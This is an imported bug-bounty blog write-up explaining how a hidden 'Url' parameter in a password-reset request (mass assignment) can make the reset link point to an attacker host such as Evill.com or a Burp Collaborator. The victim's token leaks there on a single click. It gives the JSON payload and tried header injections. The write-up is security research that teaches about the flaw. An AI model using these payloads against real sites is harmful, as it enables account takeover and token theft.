---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-01-01_one-click-to-account-takeover.md
original_filename: 2022-01-01_one-click-to-account-takeover.md
title: One Click To Account Takeover
category: documents
detected_topics:
- api-security
- command-injection
- otp
- rate-limit
tags:
- imported
- documents
- api-security
- command-injection
- otp
- rate-limit
language: en
raw_sha256: ca8df9c85ffdfb4eb1808446831b166ef7d2b19c5e8b54990e08321a702113df
text_sha256: 2d1d255d2158c4642bee5ffe0cb23a1fa93470b8532859f90c4c03c44006dc11
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: false
---

# One Click To Account Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-01-01_one-click-to-account-takeover.md
- Source Type: markdown
- Detected Topics: api-security, command-injection, otp, rate-limit
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: False
- Raw SHA256: `ca8df9c85ffdfb4eb1808446831b166ef7d2b19c5e8b54990e08321a702113df`
- Text SHA256: `2d1d255d2158c4642bee5ffe0cb23a1fa93470b8532859f90c4c03c44006dc11`


## Content

---
title: "One Click To Account Takeover"
url: "https://m7-arman.medium.com/one-click-to-account-takeover-1f78c6003eba"
authors: ["M7.Arman (@ArmanSecurity)"]
bugs: ["Mass assignment"]
publication_date: "2022-01-01"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3042
scraped_via: "browseros"
---

# One Click To Account Takeover

Top highlight

One Click To Account Takeover
M7arm4n
Follow
2 min read
·
Jan 1, 2022

201

1

Hello amazing hunters.

Today , I want to tell a story about my favorite endpoint , Again.

I noticed in the last story , How i able to takeover user’s account with zero click.

Today , I want to try another way to takeover account but this time we need one click from user. 😉

OVERVIEW :

In target.com when we ask reset password , We will receive an email with a reset password link.

Target.com/RestPassword/Token/blablablabla

This time , I focus on steal user’s token.

In first try , I inject some header like :

“X-Forwarded-Host:”
“X-Forwarded-For:”

Unfortunately , Site was not vulnerable to host header injection.

In second try , I noticed a cool thing which lead me to change Host of reset password link but it was not clearly.

Golden Tip :

I want to tell you a golden tip in this scenario , Should notice to mass assignment vulnerability. If i capture the reset password request , In body request i have a parameter in content-type of json:

{“email” : “Evil@attacker.com”}

I said to myself , Is it possible some hidden parameters in request ?

Get M7arm4n’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Normally if user send a request with null value , The parameter filled with default value.

Unfortunately , I couldn’t use param miner because the endpoint has rate limit and after each test parameter , I had to check the email. I had to test my word list manually :)

After short time i found a simple parameter that lead me change all the Host and path of reset password link.

When i sent my request with these parameters :

{“email” : “Evil@attacker.com” , “Url” : “https://Evill.com/Angel/”}

I got :

https://Evill.com/Angel/blablablabla

Yes, We did it. 😎🥂

EXPLOIT

To exploit this vulnerability , We have to enter victim email and capture the request after add “Url” parameter with my burp collaborators as value , Then forward the request. One click from user need till account takeover.

After user click on link , We will receive his/her token in burp collaborator then enter the token , ….. 😉

I hope this write-up was helpful for you, Have a good day.

YouTube

Instagram

Twitter
